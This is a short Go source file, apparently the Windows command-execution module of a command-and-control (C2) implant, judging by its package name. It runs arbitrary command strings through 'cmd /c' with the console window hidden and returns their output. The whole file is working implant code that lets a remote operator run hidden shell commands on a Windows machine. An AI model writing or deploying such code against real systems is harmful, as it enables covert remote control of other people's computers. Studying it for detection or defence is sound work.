//go:build windows

package C2

import (
	"os/exec"
	"strings"
	"syscall"
)

func executeCommand(commandToExecute string) string {

	var arguments []string
	var err error

	splitArgs := strings.Split(commandToExecute, " ")

	// For windows commands must be on the form: "cmd /c <command>" Example "cmd /C dir"
	arguments = append(arguments, "/c")
	arguments = append(arguments, splitArgs...)
	cmd_instance := exec.Command("cmd", arguments...)
	cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	outCommand, err := cmd_instance.Output()

	if err != nil {
		out := err.Error()
		return out
	}

	out := string(outCommand)
	return out
}
